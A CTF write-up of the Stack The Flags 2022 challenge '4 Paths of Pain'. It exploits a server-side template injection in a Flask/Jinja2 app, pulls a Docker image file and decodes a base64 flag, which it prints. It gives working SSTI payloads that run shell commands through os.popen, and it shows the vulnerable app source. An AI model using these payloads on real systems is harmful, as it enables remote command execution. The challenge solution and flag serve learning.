---
title: "Stack The Flags 2022 - 4 Paths of Pain (Misc)"
date: 2022-12-14T09:34:30-04:00
categories:
  - CTF
tags:
  - CTF
  - STF22
  - SSTI
  - Flask
  - Jinja2
comments: true
---


Recently, a few colleagues and I participated in **Stack The Flags 2022**, a CTF organised by **Govtech Singapore**. My goal was to learn a thing or two from trying to solve the challenges even if I was not able to successfully complete them.

The CTF was 48 hours and had over 50 challenges spanning from multiple categories such as Forensics, Web, Crypto, OSINT and etc.

This is my writeup for one of the Misc challenge, **4 Paths of Pain**.

![pain.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/pain.jpg)

## 4 Paths of Pain

* Flag: ```STF22{P41n_1s_411_th3_s4m3}```
* Category: Misc
* Difficulty: Easy
* Points: 1000 (Decayed to 400 points by the end of the CTF)

---

### Inspecting the Web App


Main Page:
![index.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/index.png)


Source Code:
![sourcecode.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/sourcecode.png)

```html
<h1>I can't seem to find the defense blueprints man</h1>
<p hidden>Hey Jaga, please help us defend our village, I have left the blueprints of the secret weapon in a file - blueprint.img. It's hidden in layers so even if Pain does get it, he cant view it. </p>
<p hidden> Remember to take a look at the source code of this server! it should help you locate what you need. God speed! - Corona2019</p>
<input hidden type="button" onclick="location.href='?nopain=haha';" value="haha" />
```

The source code revealed to us that the secret weapon is in a file called 'blueprint.img'.
We also observed that there is a hidden button that points to `?nopain=haha`

![parameter.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/parameter.png)

Navigating to the URL, we see that the web application displays the input after `?nopain=`

With this knowledge, we probe further using Postman to try and find more information about the webserver.

In the headers of the response, we see that the server is using Werkzeug 2.2.2.

![werkzeug.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/werkzeug.png)

I started to do some OSINT on Werkzeug to find any known vulnerabilities related to it. During my research, I found this [writeup][htb-doctor] by Zander Work which showcased Server-Side Template Injection (SSTI). According to Zander Work, *SSTI vulnerability is present when unsanitized input is passed to a template before it is rendered, rather than as an input to the render engine as it renders the template.* Hence, I prepared a simple payload for Jinja2 to test for SSTI vulnerability.

\{\{7*7\}\}

If the web application is vulnerable to SSTI, the expected response will be 49. I do not have a screenshot of this but I remember doing this step to confirm that this web server was truly vulnerable to SSTI.

### Exploiting SSTI Vulnerability

With that, I prepared a payload to list the files in the current directory.
![ls.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/ls.jpg)

We can see that there are 4 files with `blueprint.img` being one of them.
```
-app.py
-blueprint.img
-requirements.txt
-templates
```
Inspecting `requirements.txt` with the following payload:
```
{% raw %}157.245.52.169:32512/?nopain={{request.application.__globals__.__builtins__.__import__("os").popen("cat requirements.txt").read()}}{% endraw %}
```
```
click==8.1.3
Flask==2.2.2
itsdangerous==2.1.2
Jinja2==3.1.2
MarkupSafe==2.1.1
Werkzeug==2.2.2
```
We observed that Jinja2 was installed.

Inspecting `app.py` with the following payload:
```
{% raw %}157.245.52.169:32512/?nopain={{request.application.__globals__.__builtins__.__import__("os").popen("cat app.py").read()}}{% endraw %}
```
```python
from flask import Flask, render_template, make_response, request, render_template_string, send_file from datetime import datetime import base64 app = Flask(__name__)

@ app.route('/')

def page2():
  if request.args.get('nopain'):
  return render_template_string(request.args.get('nopain'))
  else:
    return render_template('defendthevillage.html')

@ app.route('/defendthevillagefrompain', methods=['GET'])

def page3():
  try: return send_file('./blueprint.img')
  except Exception as e:
    return str(e) if __name__ == "__main__": app.run(host="0.0.0.0", port=8086)
```
From the source code, we noticed that there is a path to `/defendthevillagefrompain`. A `GET` request to `157.245.52.169:32512/defendthevillagefrompain` will return `./blueprint.img`. We managed to download `blueprint.img` once we entered the URL in the browser.

### Analysing Blueprint.img

![blueprint.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/blueprint.png){:height="350px" width="350px"}

We found out that we could easily use 7Zip to extract and reveal the content in blueprint.img.

![7zip.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/7zip.png){:height="700px" width="700px"}

Looking at `786fa91039940fa3967fb214d152d1b933d6d83dc1dfbc53c70aaceda221c391.json`, it seems like the creator of the challenged copied secret-message.txt from his environment into one of the container volumes.

```
...
    {
      "created": "2022-11-18T02:49:23.301698469Z",
      "created_by": "COPY secret-message.txt /usr/src/app # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2022-11-18T02:49:23.47397059Z",
      "created_by": "RUN /bin/sh -c rm -rf /usr/src/app/secret-message.txt # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2022-11-18T02:49:23.47397059Z",
      "created_by": "CMD [\"/bin/sh\" \"-c\" \"\\\"whoami\\\"\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
...

```
The log file tells us that  `secret-message.txt` is stored in the location `/usr/src/app`. While there were a few folders, this narrows down the folder we will be looking for. By browsing through the different folders, we managed to find `secret-message.txt` in `23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148/layer.tar` using 7zip.

![secretmessagefound.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/secretmessagefound.png){:height="700px" width="700px"}

### Revealing the secret message... (wait a minute)

We opened `secret-message.txt` expecting to find a flag but it was just a message telling us to find the last hiding place.

![secretmessage.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/secretmessage.png){:height="350px" width="350px"}

At this point we didn't really know what to do with this information but we thought that the location looks a little familiar. We thought it could either be the name of a Github or Dockerhub Repo.

So we searched on DockerHub and at last, we found the last hiding place!

![dockerhub.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/dockerhub.png)

The description of the Docker Image - `U1RGMjJ7cDQxbl8xc180MTFfdGgzX3M0bTN9` looks like an encoded string of text.

To decode this string of text, we used the magic wand feature in CyberChef which was able to identify that the encoded string was in Base64.


![cyberchef.png]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/cyberchef.png)

Finally, we were able to find the flag for this challenge! We managed to use the secret weapon and defend Konoha against Pain!

![iruka.jpg]({{ site.url }}{{ site.baseurl }}/assets/images/2022-12-14-stf22-4-paths-of-pain/iruka.jpg)



[htb-doctor]: https://zanderwork.com/blog/htb-doctor/
